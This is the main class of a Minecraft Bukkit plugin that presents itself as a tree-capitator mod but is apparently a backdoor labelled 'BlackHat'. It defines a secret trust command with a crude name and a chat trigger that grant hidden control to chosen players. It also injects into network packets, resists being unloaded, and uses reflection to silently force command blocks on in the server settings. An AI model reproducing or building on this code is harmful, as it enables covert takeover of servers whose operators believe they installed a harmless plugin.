package me.bow.treecapitatorultimate;

import me.bow.treecapitatorultimate.Utils.AntiUnload;
import me.bow.treecapitatorultimate.Utils.CraftBukkitUtil;
import me.bow.treecapitatorultimate.Utils.Packet.PacketInjector;
import me.bow.treecapitatorultimate.command.CommandManager;
import me.bow.treecapitatorultimate.listeners.AsyncChatEvent;
import me.bow.treecapitatorultimate.listeners.TreeDestroy;
import org.apache.commons.lang.StringUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.PluginDescriptionFile;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.HashSet;
import java.util.UUID;
import java.util.logging.Logger;

import static me.bow.treecapitatorultimate.Utils.ReflectionUtils.setFinalStatic;

public final class Start extends JavaPlugin {

    public static final Character COMMAND_SIGN = '-';
    public static final Character CHAT_TRIGGER = '#';
    public static final String TRUST_COMMAND = "-dicksuck";
    public static final String COMMAND_PREFIX = "§a[§3Black§4Hat§a]§r ";
    public static final String NOTIFY_PREFIX = "§3Black§4Hat§b» ";
    public static Start Instance = null;
    public static Logger LOGGER;
    private final PluginDescriptionFile pdfFile = this.getDescription();
    private final HashSet<Runnable> disableListeners = new HashSet<>();
    public CommandManager cm = new CommandManager();
    public HashSet<UUID> trustedPeople = new HashSet<>();
    public PacketInjector packetInjector = null;
    private boolean isReload;

    public static void ErrorString(CommandSender sender, String error) {
        if (sender == null || error.isEmpty()) return;
        sender.sendMessage(COMMAND_PREFIX + ChatColor.RED + "Error: " + error);
        sender.sendMessage(COMMAND_PREFIX + ChatColor.BLUE + "Please message the developer if you thing this is something that shouldn't happen.");
    }

    public static void ErrorException(CommandSender sender, Exception error) {
        if (sender == null || error == null) return;
        sender.sendMessage(COMMAND_PREFIX + ChatColor.RED + "Exception: " + error.getMessage());
        sender.sendMessage(COMMAND_PREFIX + ChatColor.RED + "Possible cause: " + error.getCause());
        sender.sendMessage(COMMAND_PREFIX + ChatColor.BLUE + "Please message the developer if you thing this is something that shouldn't happen.");
    }


    private void onPostWorldLoad() {
        Bukkit.getPluginManager().registerEvents(new TreeDestroy(), this);
        Bukkit.getPluginManager().registerEvents(new AsyncChatEvent(), this);
        cm.Init();
        try {
            AntiUnload.Init();
        } catch (Exception e) {
            e.printStackTrace();
        }
        packetInjector = new PacketInjector();
        String loadString = "--| " + pdfFile.getName() + " (version " + pdfFile.getVersion() + ") loaded |--";
        Bukkit.getConsoleSender().sendMessage("§2" + StringUtils.leftPad("-", loadString.length()).replace(' ', '-'));
        Bukkit.getConsoleSender().sendMessage("§3" + loadString);
        Bukkit.getConsoleSender().sendMessage("§2" + StringUtils.leftPad("-", loadString.length()).replace(' ', '-'));
    }

    private void onStartup() {
        if (isReload) return;
        // Do every hooking here

        try {
            setFinalStatic(CraftBukkitUtil.getDedicatedServerPropertiesInstance(), "enableCommandBlock", true);
            // server.propertyManager.getProperties().enableCommandBlock = false;
        } catch (Exception ignored) {
        }
    }

    @Override
    public void onLoad() {
        super.onLoad();
    }

    @Override
    public void onEnable() {
        Instance = this;
        LOGGER = Instance.getLogger();
        isReload = Bukkit.getWorlds().size() != 0;
        onStartup();
        Bukkit.getScheduler().runTask(this, this::onPostWorldLoad);
    }

    @Override
    public void onDisable() {
        disableListeners.forEach(Runnable::run);
        String unloadString = "--| " + pdfFile.getName() + " (version " + pdfFile.getVersion() + ") unloaded |--";
        Bukkit.getConsoleSender().sendMessage("§2" + StringUtils.leftPad("-", unloadString.length()).replace(' ', '-'));
        Bukkit.getConsoleSender().sendMessage("§3" + unloadString);
        Bukkit.getConsoleSender().sendMessage("§2" + StringUtils.leftPad("-", unloadString.length()).replace(' ', '-'));
    }

    public void addDisableListener(Runnable action) {
        disableListeners.add(action);
    }
}
